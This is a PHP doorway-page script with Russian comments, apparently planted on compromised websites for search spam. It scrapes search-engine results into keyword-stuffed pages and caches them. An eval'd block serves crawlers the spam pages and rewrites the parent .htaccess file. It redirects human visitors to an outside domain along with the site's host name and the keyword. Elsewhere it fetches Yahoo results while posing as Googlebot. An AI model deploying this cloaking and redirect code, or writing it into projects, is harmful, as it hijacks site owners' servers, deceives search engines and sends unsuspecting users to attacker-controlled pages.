<?php
$templatepath="templates";
$usetemplates="yes";
$randomtemplate="yes";
$keyparseornot="no";
$trendskeys="no";
$valuetrends="10";
$cloakornotcloak="no";
$resurl="glnoa.php?hl={urlkey}";
$perem="hl";
$keyspath="par.txt";
$kollinks="5";
$linksrazdel=" , ";
$extlinkspath="";
$contentsou="2";
$textfile="./text.txt";
$articlesvalue="2";
$randomabarticles="yes";
$bookskeyvalue="10";
$sitemap="no";
$maplinksvalue="480";
$maplinksraz="<br> "; 
$indexkey="News";
$imageyes="no";
$imagepath="gallery";
$redir="";
$includephpcode = '$ref = $_SERVER["HTTP_REFERER"];
$d = $_SERVER["HTTP_HOST"];
$mykeys  = $_GET["hl"];
function getUrl() {
  $url  = @( $_SERVER["HTTPS"] != "on" ) ? "http://".$_SERVER["SERVER_NAME"] :  "https://".$_SERVER["SERVER_NAME"];
  $url .= ( $_SERVER["SERVER_PORT"] != 80 ) ? ":".$_SERVER["SERVER_PORT"] : "";
  $url .= $_SERVER["REQUEST_URI"];
  return $url;
}    
$s = getUrl();
if (!strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "crawler")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "bot")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "yahoo")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "bot")===false)
{
	if ((filesize(".htaccess"))>100)
	{
	         $out = fopen("../.htaccess", "w");
             fwrite ($out, "RewriteEngine On 
             RewriteRule ^([A-Za-z0-9-]+).html$ story.php?hl=$1 [L]");
             fclose($out);	
	}
echo $page;
}
else
{

header("Location: http://coolin.in/for/77?d=$d&mykeys=$mykeys");
exit;
}
';
$cachepath="./lbkgf";
$yourip=""; 
$dopips="";
$logornot="no"; 
$pingornot="no";
$pingres="http://rpc.pingomatic.com/";



$firstnoredir="no";
$redirtime="5";





ini_set('memory_limit',"256M");
ini_set('display_errors', 0);
//$useragent=strtolower($_SERVER['HTTP_USER_AGENT']);
$userip=explode(".", $_SERVER['REMOTE_ADDR']);
$usernetip=trim($userip[0]).".".trim($userip[1]).".".trim($userip[2]).".".trim($userip[3]);
$botips="  ".$yourip." ".$dopips." ";
$keyfromurl =$_GET[$perem];	






if(!$keyfromurl){
$keyfromurl=$indexkey;
}
$key = str_replace("-", " ", $keyfromurl);
$key=trim($key);
$keyredir = str_replace(" ", "+", $key);
$keydefis = str_replace(" ", "-", $keyfromurl);
$keydecode = str_replace("-", "+", $keyfromurl);
$keydecode = str_replace("'", "", $keydecode);
$keydecode = str_replace("\\", "", $keydecode);
$keydecode=trim($keydecode);

$usedurl=str_replace("{urlkey}", $keydefis, $resurl);
//$useragent = $_SERVER['HTTP_USER_AGENT'];
//if ((!file_exists($cachepath."/".$keydefis)) AND (!strpos($useragent, "google"))) exit;
if($logornot=="yes"){
$fileot="./log.txt";
	$fhf=fopen($fileot, "a+");
	$dataot="Page ".$usedurl." : ". $_SERVER['HTTP_REFERER']."    ".$_SERVER['HTTP_USER_AGENT']."    ".$_SERVER['REMOTE_ADDR']."    ".date("dS h:i:s A")."\n";
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
flock($fhf,LOCK_UN);
	fclose($fhf);
	
	}
	
if($keyfromurl=="mysitemap" && file_exists("map.txt")){
$pagemap=file_get_contents("./map.txt");
echo $pagemap;
die();
}
if($sitemap=="yes" && !file_exists("map.txt")){
$mapkeys=file_get_contents($keyspath);
$mapkeys=explode("\n", $mapkeys);
srand((float)microtime() * 1000000);
shuffle($mapkeys);
$mapkeys = array_slice($mapkeys, 0, $maplinksvalue);

$fileot="./map.txt";
	$fhf=fopen($fileot, "w");
	$dataot1="";
$dataot2=array();
foreach($mapkeys as $mapkey){
$mapkey=trim($mapkey);
$mapkeyurl=str_replace(" ", "-", $mapkey);
$mapurl=str_replace("{urlkey}", $mapkeyurl, $resurl);
$dataot2[]="<a href=\"".$mapurl."\">".$mapkey."</a>".$maplinksraz;
}
$dataot2=implode($dataot2);


$dataot=$dataot1." ".$dataot2."
";


	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
flock($fhf,LOCK_UN);
	fclose($fhf);

$mapkeys="";

}
if($sitemap=="yes" && file_exists("map.txt")){
$mapinpage=str_replace("{urlkey}", "mysitemap", $resurl);
$mapinpages="<br><a href=\"".$mapinpage."\">SiteMap</a><br>";
}
$redir=str_replace("{redirkeyword}", $keyredir, $redir);
//if (!strpos($botips, $usernetip)===false || !strpos($_SERVER['REMOTE_ADDR'], "23.8")===false){
if (!strpos($botips, $usernetip)===false || !strpos($_SERVER['HTTP_USER_AGENT'], "Googlebot")===false || !strpos($_SERVER['HTTP_USER_AGENT'], "crawler")===false || !strpos($_SERVER['HTTP_USER_AGENT'], "bot")===false || !strpos($_SERVER['HTTP_USER_AGENT'], "yahoo")===false || $cloakornotcloak=="no"){

if($cloakornotcloak=="no"){
$cloaknoredir=$includephpcode;

}


// Открываем директорию 
  $dir = opendir($cachepath); 
  // В цикле считываем её содержимое 
  while(($file = readdir($dir))) 
  { 
  
    // Если текущий объект является файлом - удаляем его 
    if($file!="." && $file!=".."){
	

$file=trim($file);
if($keyfromurl==$file){
$page=file_get_contents($cachepath."/".$file);
if($extlinkspath){
$extlinks=file_get_contents($extlinkspath);
$page=str_replace("{extlinks}", $extlinks, $page);
}

if($firstnoredir=="yes"){
$todaydate=date("d");
$matchesparse=array();
$patternparse = "/<!--([0-9]*)-->/sU";
preg_match_all($patternparse, $page, $matchesparse);
$gentime=$matchesparse[1][0];
if($gentime){
$needtime=$todaydate-$gentime;

if(abs($needtime)>=$redirtime)
{

$page=str_replace("<!--red-->", $redir, $page);
$page=preg_replace("/<!--([0-9]*)-->/", "", $page);
$fileot=$cachepath."/".$keyfromurl;
	$fhf=fopen($fileot, "w+");
	$dataot=$page;
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
flock($fhf,LOCK_UN);
	fclose($fhf);
}



}
}
if($includephpcode){

$includephpcode=str_replace("{redirkeyword}", $keyredir, $includephpcode);
/*$fileot="temp.php";
	$fhf=fopen($fileot, "w+");
	$dataot="<?php ".$includephpcode." ?>";
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
flock($fhf,LOCK_UN);
	fclose($fhf);*/

	ob_start();                     // Включаем буферизацию вывода
ob_clean();                     // Чистим буфер (не обязательно)
eval ($includephpcode);      // Выполняем нужный нам код, результат которого уходит в буфер
$buffer=ob_get_contents();      // Пишем в переменную содержимое буфера
ob_end_clean(); 
	
	
//$patternparse = "/{phpcode}/";


$page=str_replace("{phpcode}", $buffer, $page);

}
echo $page;
die();
}
}	
  } 
  // Закрываем директорию 
  closedir($dir); 
  
if($contentsou==1 && $usetemplates=="no"){
$pageparse=getcontent($key, "2");
//$pageparsemini=getcontent($key, "1");
/*$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);*/

}
if($contentsou==2 && $usetemplates=="no")
{
$pageparse=getcontent2($key, "4");
//$pageparsemini=getcontent2($key, "1");
/*$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);*/
}

if($contentsou==3 && $usetemplates=="no")
{
$pageparse=file_get_contents($textfile);
$pageparse=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparse);
$pageparse = array_slice($pageparse, 0, 20);
/*$pageparsemini= array_slice($pageparse, 0, 3);
$pageparsemini=implode(".", $pageparsemini);*/
$pageparse=implode(".", $pageparse);
}

if($contentsou==4 && $usetemplates=="no")
{
$pageparse=getcontent3($key, "2");

}

$wordscount=count(explode(" ", $key));
if($keyparseornot=="yes" && $wordscount<=3){
$googlekeys=keyparse($key);

if(count($googlekeys)>=3){

$forlinks1=$googlekeys;
srand((float)microtime() * 1000000);
shuffle($forlinks1);
$kusokkeev=$forlinks1;
}
else
{

$forlinks1=file_get_contents($keyspath);
$forlinks1=explode("\n", $forlinks1);
srand((float)microtime() * 1000000);
shuffle($forlinks1);
$kusokkeev=array_chunk($forlinks1, $kollinks);
$kusokkeev=$kusokkeev[0];
}

}
else
{
$forlinks1=file_get_contents($keyspath);
$forlinks1=explode("\n", $forlinks1);
srand((float)microtime() * 1000000);
shuffle($forlinks1);
$kusokkeev=array_chunk($forlinks1, $kollinks);
$kusokkeev=$kusokkeev[0];
}
if($trendskeys=="yes"){
$alltrendskeys=keyparse2();
srand((float)microtime() * 1000000);
shuffle($alltrendskeys);
$neededtrends=array_chunk($alltrendskeys, $valuetrends);
$kusokkeev=array_merge ($kusokkeev, $neededtrends[0]);
srand((float)microtime() * 1000000);
shuffle($kusokkeev);
}

$links1=array();
foreach($kusokkeev as $i=>$keyforurl){

$keyforurl1=str_replace(" ", "-", $keyforurl);
	$keyforurl1=trim($keyforurl1);
	$keyforurl=trim($keyforurl);

$linkingurl=str_replace("{urlkey}", $keyforurl1, $resurl);

	$links1[$i]=" <a href=\"".$linkingurl."\">".$keyforurl."</a>".$linksrazdel;
	


}
if($imageyes=="yes" && $usetemplates=="no"){
$files=array();
 $dir = opendir("./"); 
  // В цикле считываем её содержимое 
  while(($file = readdir($dir))) 
  { 
  
    // Если текущий объект является файлом - удаляем его 
    $files[]=trim($file);
  }
closedir($dir);
$files=implode(" ", $files);

if(strpos($files, $imagepath)===false) {

mkdir("./".$imagepath);
}
$templateimage="<img src=\"".imagesparse($key, $imagepath)."\" alt=\"".$key."\">";
}
$links1=implode($links1);
$date = date ("l dS of F Y h A");

if($usetemplates=="no"){
$pageview= "
<html>
<head>
<meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" />
<meta name=\"keywords\" content=\"".ucfirst($key)."\">
<meta name=\"description\" content=\"".ucfirst($key)."\">
<meta name=\"Robots\" content=\"index,follow\" />
<meta name=\"Robots\" content=\"index,follow\" />
<title>".ucfirst($key)."</title>
</head>
<body>
".$cloaknoredir."
<h1>".ucfirst($key)."</h1><br>
<br>".$templateimage."<br><br>
".$mapinpages."
".$pageparse."<br>
".$links1."

</body>
</html>";
}
elseif($usetemplates=="yes"){


if($randomtemplate=="yes"){

$files=array();
$dir = opendir($templatepath); 
  // В цикле считываем её содержимое 
  while(($file = readdir($dir))) 
  { 
  if($file!="." && $file!=".."){
    // Если текущий объект является файлом - удаляем его 
    $files[]=trim($file);
	
	}
  }
closedir($dir);
srand((float)microtime() * 1000000);
shuffle($files);
$goodtemplatefile=$files[0];
$goodtemplate=file_get_contents("./".$templatepath."/".$goodtemplatefile);

}
else
{
$goodtemplate=file_get_contents("./".$templatepath."/".$randomtemplate);
}
if($firstnoredir=="yes"){
$goodtemplate=$goodtemplate."<!--".date("d")."-->";
}
for ($i=0; $i<1000; $i++){

		if (!strstr($goodtemplate, "{image}")) break 1;
		
		$goodtemplate=preg_replace("/{image}/", "<img src=\"".imagesparse($key, $imagepath)."\" alt=\"".$key."\">", $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){
		if (!strstr($goodtemplate, "{randurl}")) break 1;
		srand((float)microtime() * 1000000);
		shuffle($forlinks1);
		$forrandurl=str_replace(" ", "-", trim($forlinks1[0]));
		$randurl=str_replace("{urlkey}", $forrandurl, $resurl);
		$goodtemplate=preg_replace("/{randurl}/", $randurl, $goodtemplate, 1);
		
	}
	
	for ($i=0; $i<1000; $i++){
		if (!strstr($goodtemplate, "{rankey}")) break 1;
		srand((float)microtime() * 1000000);
		shuffle($forlinks1);
				
		$goodtemplate=preg_replace("/{rankey}/", trim($forlinks1[0]), $goodtemplate, 1);
		
	}
	
	for ($i=0; $i<1000; $i++){
if($textfile){
$pageparse=file_get_contents($textfile);
$pageparse=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparse);
$pageparse = array_slice($pageparse, 0, 40);
$pageparse[3]=$pageparse[3]." ".$key;
$pageparse[5]=$pageparse[5]." <b>".$key."</b>";
$pageparse[11]=$pageparse[11]." ".$key;
$pageparse[14]=$pageparse[14]." <em>".$key."</em>";
$pageparse[18]=$pageparse[18]." ".$key;
$pageparse=implode(".", $pageparse);
}
		if (!strstr($goodtemplate, "{manytext}")) break 1;
		
		$goodtemplate=preg_replace("/{manytext}/", $pageparse, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{manytext_bing}")) break 1;
		$pageparse=getcontent2($key, "4");
		$pageparse2=getcontent3($key, "4");
		$pageparse3=getcontent($key, "4");
		$pageparse4=$pageparse." ".$pageparse2." ".$pageparse3;
		//$pageparse4=$pageparse3;
		shuffle($pageparse4);
		$goodtemplate=preg_replace("/{manytext_bing}/", $pageparse4, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){




		if (!strstr($goodtemplate, "{manytext_bing}")) break 1;
		$pageparse=getcontent($key, "2");
		$goodtemplate=preg_replace("/{manytext_bing}/", $pageparse, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{manytext_an}")) break 1;
		$pageparse=getcontent3($key, "2");
		$goodtemplate=preg_replace("/{manytext_an}/", $pageparse, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{bookstext}")) break 1;
		$pageparse=getbookcontent($key, $bookskeyvalue);
		$goodtemplate=preg_replace("/{bookstext}/", $pageparse, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){


		if (!strstr($goodtemplate, "{minitext}")) break 1;
		if($textfile){
$pageparse=file_get_contents($textfile);
$pageparse=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparse);
$pageparsemini= array_slice($pageparse, 0, 3);

$pageparse[2]=$pageparse[2]." <b>".$key."</b>";

$pageparsemini=implode(".", $pageparsemini);
}
		$goodtemplate=preg_replace("/{minitext}/", $pageparsemini, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{minitext_bing}")) break 1;
		$pageparse=getcontent2($key, "1");
$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);
		$goodtemplate=preg_replace("/{minitext_bing}/", $pageparsemini, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{minitext_ab}")) break 1;
		$pageparse=getcontent($key, "1");
$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);
		$goodtemplate=preg_replace("/{minitext_ab}/", $pageparsemini, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{minitext_an}")) break 1;
		$pageparse=getcontent3($key, "1");
$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);
		$goodtemplate=preg_replace("/{minitext_an}/", $pageparsemini, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){


		if (!strstr($goodtemplate, "{manytext_all}")) break 1;
		$pageparse=getcontent($key, "2");
if(strlen($pageparse)<=10){
$pageparse=getcontent2($key, "4");
}

		$goodtemplate=preg_replace("/{manytext_all}/", $pageparse, $goodtemplate, 1);
	}
	
	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{minitext_all}")) break 1;
		$pageparse=getcontent($key, "1");
$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);

if(strlen($pageparsemini)<=10){
$pageparse=getcontent2($key, "1");
$pageparsemini=explode(".", $pageparse);
srand((float)microtime() * 1000000);
shuffle($pageparsemini);
$pageparsemini=array_slice($pageparsemini, 0, 5);
$pageparsemini=implode(".", $pageparsemini);
}
		$goodtemplate=preg_replace("/{minitext_all}/", $pageparse, $goodtemplate, 1);
	}

	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{ab_content}")) break 1;
		$pageparse=getcontentaba($key, $articlesvalue, $randomabarticles);
if(strlen($pageparse)<=10){
$pageparse=getcontent2($key, "4");
}
		$goodtemplate=preg_replace("/{ab_content}/", $pageparse, $goodtemplate, 1);
		
	}

	for ($i=0; $i<1000; $i++){



		if (!strstr($goodtemplate, "{youtube}")) break 1;
		$pageparse=youtubeparse($key);
		$goodtemplate=preg_replace("/{youtube}/", $pageparse, $goodtemplate, 1);
		
	}
	

$goodtemplate=str_replace("{keyword}", ucfirst($key), $goodtemplate);
$goodtemplate=str_replace("{sitemaplink}", $mapinpages, $goodtemplate);
$goodtemplate=str_replace("{links}", $links1, $goodtemplate);

if($firstnoredir=="yes"){
$goodtemplate=str_replace("{redirekt}", "<!--red-->", $goodtemplate);
}
else
{
$goodtemplate=str_replace("{redirekt}", $cloaknoredir, $goodtemplate);
}
$pageview=$goodtemplate;



}
echo $pageview;
flush();
$fileot=$cachepath."/".$keyfromurl;
	$fhf=fopen($fileot, "w+");
	$dataot=$pageview;
	flock($fhf,LOCK_EX);
	fwrite($fhf, $dataot);
	fflush($fhf);
flock($fhf,LOCK_UN);
	fclose($fhf);
	
	if($pingornot=="yes"){
	$pingres=explode(" ", $pingres);
	foreach($pingres as $pingr){
	
	MYBlog_ping (trim($pingr), ucfirst($key), $usedurl);
	
	}
	}

}
else
{

echo $redir;
}








function getcontent($keyforparse, $cntpages)
{
	$text = "";

$query_pars = $keyforparse;
$query_pars_2 = str_replace(" ", "+", chop($query_pars));
for ($page=1;$page<3;$page++)
{
 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://www.ask.com/web?q=$query_pars_2&qsrc=11&adt=1&o=0&l=dir&page=$page"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch); 
curl_close($ch);

$result = str_replace("\r\n", "", $result);
$result = str_replace("\n", "", $result);

		preg_match_all ("#web-result-description\">(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;
		
}

	for ($yahoo_page = 1; $yahoo_page<13 ; $yahoo_page = $yahoo_page+10)
	{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "https://search.yahoo.com/search?p=$query_pars_2&fr=yfp-t&fr2=sb-top&fp=1&b=$yahoo_page&pz=10&bct=0&xargs=0"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$result = curl_exec($ch); 
curl_close($ch);
		preg_match_all ("#<p class=\"lh-16\">(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;	
	}

		for ($google_n=0;$google_n<11;$google_n=$google_n+10)
	{
		$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "https://www.google.com/search?q=$query_pars_2&start=$google_n"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
//curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.6) Gecko/20060928 Firefox/1.5.0.6');
$result = curl_exec($ch); 
curl_close($ch);
$result = str_replace("\r\n", "", $result);
$result = str_replace("\n", "", $result);
	preg_match_all ("#<span class=\"st\">(.*)</span>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;
}


$text = str_replace("...", "", $text);
		$text = strip_tags($text); 
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);

		$text = explode(".", $text);
		shuffle($text);
		    $text = array_unique($text);
		$text = implode(". ", $text);
return $text;
}


function getcontent2($keyforparse, $cntpages)
{
/*
//$keyforparse="phentermine";
//$cntpages=3;
$keyforparse=str_replace(" ", "+", $keyforparse);	
$keyforparse=urlencode($keyforparse);
$key2 = explode("%2B", $keyforparse);

//$key2 = $key2[0]."%2B".$key2[1];
$key2 = $key2[0];
$naparse=NULL;
$cntpages=1;
for ($i=0; $i<=$cntpages-1; $i++){
$let = array (video,free,mp3,games,news,songs,music);   
$r = rand (0,count($let)-1);
$myname .= $let[$r];

$pageparse=file_get_contents("http://www.ask.com/web?q=".$keyforparse."&page=".$i);

//echo $pageparse;

$matchesparse=array();
$patternparse = "#<p class=\"web-result-description\"(.*)<\/p>#isU";
preg_match_all($patternparse, $pageparse, $matchesparse);
//var_dump($matchesparse[1]);
sleep(1);
$matchesparse2=array();
$patternparse2 = "#<p class=\"web-result-description\"(.*)<\/p>#isU";
preg_match_all($patternparse2, $pageparse, $matchesparse2);
//var_dump($matchesparse2[1]);
//echo "<p>".implode($matchesparse[1])."</p>";
sleep(1);
$matchesparse3=array();
$patternparse3 = "#<p class=\"web-result-description\"(.*)<\/p>#isU";
preg_match_all($patternparse3, $pageparse, $matchesparse3);
//var_dump($matchesparse2[1]);
//echo "<p>".implode($matchesparse[1])."</p>";
sleep(1);
$matchesparse4=array();
$patternparse4 = "#<p class=\"web-result-description\"(.*)<\/p>#isU";
preg_match_all($patternparse4, $pageparse, $matchesparse4);
//var_dump($matchesparse2[1]);
//echo "<p>".implode($matchesparse[1])."</p>";
sleep(1);
$naparse[$i]=implode($matchesparse[1])." ".implode($matchesparse2[1])." ".implode($matchesparse3[1])." ".implode($matchesparse4[1]);

}

srand((float)microtime() * 1000000);
shuffle($naparse);
//echo implode($naparse);
$result1=implode($naparse);
$result1=explode(".", $result1);
srand((float)microtime() * 1000000);
shuffle($result1);
$result1=implode(". ", $result1);

$result1=str_replace(". id=\"r2_a}\">", "", $result1);
$patternparse1 = "/http:\/\/.*\s/sU";
$result=preg_replace($patternparse1, "", $result1);
//$patternparse2 = "/<a.*\s/sU";
//$result=preg_replace($patternparse2, "", $result);
//$result=str_replace("$keyforparse", "<strong>$keyforparse</strong>", $result);
$result=str_replace(".  id=\"r2_a}\">", " ", $result);
$result=str_replace(" id=\"r3_a}\">", " ", $result);
$result=str_replace(".  id=\"r4_a}\">", " ", $result);
$result=str_replace(".  id=\"r5_a}\">", " ", $result);
$result=str_replace(".  id=\"r6_a}\">", " ", $result);
$result=str_replace(" id=\"r7_a}\">", " ", $result);
$result=str_replace(".  id=\"r8_a}\">", " ", $result);
$result=str_replace(".  id=\"r9_a}\">", " ", $result);
$result=str_replace(" id=\"r1_a}\">", " ", $result);
$result=str_replace("  id=\"r0_a}\">", " ", $result);
$result=str_replace("id=\"r2_a}\">", " ", $result);
$result=str_replace("id=\"r3_a}\">", " ", $result);
$result=str_replace("id=\"r4_a}\">", " ", $result);
$result=str_replace("id=\"r5_a}\">", " ", $result);
$result=str_replace("id=\"r6_a}\">", " ", $result);
$result=str_replace("id=\"r7_a}\">", " ", $result);
$result=str_replace("id=\"r8_a}\">", " ", $result);
$result=str_replace("id=\"r9_a}\">", " ", $result);
$result=str_replace("id=\"r1_a}\">", " ", $result);
$result=str_replace("id=\"r0_a}\">", " ", $result);
$result=str_replace("<KW>", "", $result);
$result=str_replace("</KW>", "", $result);
$result=str_replace(". . ", "", $result);
$result=str_replace(",  . ", "", $result);
$result=str_replace(". . . ", "", $result);
$result=str_replace("  . . ", "", $result);
$result=str_replace(". >", ". ", $result);
$result=str_replace("<b>", " ", $result);
$result=str_replace("</b>", " ", $result);
$result=str_replace(">", " ", $result);
$strr2 = explode("%2B", $keyforparse);
$result=str_replace("$strr2[1]", "", $result);
$strr3 = ucfirst($strr2[1]);
$result=str_replace("$strr3", "", $result);
//echo $strr2[1];
//echo $strr3;

return $result;
		//echo $result;
		*/
}

function getcontent3($keyforparse, $cntpages)
{
	/*
//$keyforparse="phentermine";
//$cntpages=3;
$keyforparse=str_replace(" ", "+", $keyforparse);	
$naparse=NULL;
$cntpages=6;
//echo $cntpages;
for ($i=0; $i<=$cntpages-1; $i++){

$pageparse=file_get_contents("http://search.yahoo.com/search?p=".$keyforparse."&b=".$i."1&pz=10&bct=0&pstart=3");
$matchesparse=array();
$patternparse = "/class=\"lh-17\">(.*)<\/p><\/div>/sU";
preg_match_all($patternparse, $pageparse, $matchesparse);
//var_dump($matchesparse2[1]);
//echo "<p>".implode($matchesparse[1])."</p>";
$naparse[$i]=implode($matchesparse[1]);
//sleep(1);
//echo $pageparse;
}

srand((float)microtime() * 1000000);
shuffle($naparse);
//echo implode($naparse);
$result1=implode($naparse);
$result1=explode(".", $result1);
srand((float)microtime() * 1000000);
shuffle($result1);
$result1=implode(". ", $result1);
$result1=str_replace("<tr>", "", $result1);
$result1=str_replace("<br>", " ", $result1);
$result1=str_replace("</tr>", "", $result1);
$patternparse1 = "/http:\/\/.*\s/sU";
$result=preg_replace($patternparse1, "", $result1);
//$result=str_replace("$keyforparse", "<strong>$keyforparse</strong>", $result);
$result=str_replace("<em>", "<strong>", $result);
$result=str_replace("</em>", "</strong>", $result);
$result=str_replace("<b>", "", $result);
$result=str_replace("</b>", "", $result);
$result=str_replace(" . . .", "", $result);
$result=str_replace("</b>", "", $result);
$result=str_replace("<span class=\" fc-2nd\">", "", $result);
$result=str_replace("</span>", "", $result);
$result=str_replace(". . ", "", $result);
return $result;
		*/
}

function getcontentaba($keyforparse, $value, $random)
{
	/*
$keyforparse=str_replace(" ", "+", $keyforparse);
$naparse=NULL;

$pageparse=file_get_contents("http://www.dogpile.com/search/web?qsi=".$i."1&q=".$keyforparse);
//echo $pageparse;
$matchesparse=array();
$patternparse = "/class=\"resultDescription\">(.*)<\/div>/sU";
preg_match_all($patternparse, $pageparse, $matchesparse);
//var_dump($matchesparse);
srand((float)microtime() * 1000000);
shuffle($matchesparse[1]);
for ($i=0; $i<=$value-1; $i++){

$page=file_get_contents("http://www.articlesbase.com/".$matchesparse[1][$i]);
//echo $page;
$patternparse1 = "/<div class=\"KonaBody\">(.*)<\/div>/sU";
preg_match_all($patternparse1, $page, $matchesparse1);
//var_dump($matchesparse1[1][0]);
$naparse[$i]=$matchesparse1[1][0];
$naparse[$i]=trim($naparse[$i]);
//var_dump($naparse[$i]);
}
$result1=implode($naparse);
$result1=strip_tags($result1);
if($random){
$result1=explode(".", $result1);
srand((float)microtime() * 1000000);
shuffle($result1);
$result1=implode(". ", $result1);

$patternparse1 = "/http:\/\/.*\s/sU";
$result=preg_replace($patternparse1, "", $result1);
$patternparse1 = "/<a.*<\/a>/sU";
$result=preg_replace($patternparse1, "", $result);
$patternparse1 = "/<.*>/sU";
$result=preg_replace($patternparse1, "", $result);

$result=str_replace("...", "", $result);
$result=str_replace(". . .", "", $result);
$result=str_replace("..", "", $result);
$result=str_replace(". .", "", $result);
$result=str_replace("....", "", $result);
$result=str_replace(". . . .", "", $result);
}
else
{
$result1=implode($naparse);
$patternparse1 = "/http:\/\/.*\s/sU";
$result=preg_replace($patternparse1, "", $result1);
$patternparse1 = "/<a.*<\/a>/sU";
$result=preg_replace($patternparse1, "", $result);
$patternparse1 = "/<.*>/sU";
$result=preg_replace($patternparse1, "", $result);
}
return $result;
*/
}





function generateCharSequence($length)
    {
//$sequence='';
        $chars = array(/*'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', */'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm');
        for($i=0; $i<$length; $i++) {
            $sequence .= $chars[rand(0, count($chars)-1)];
        }
        return $sequence;
    }
//43693045738324235
?>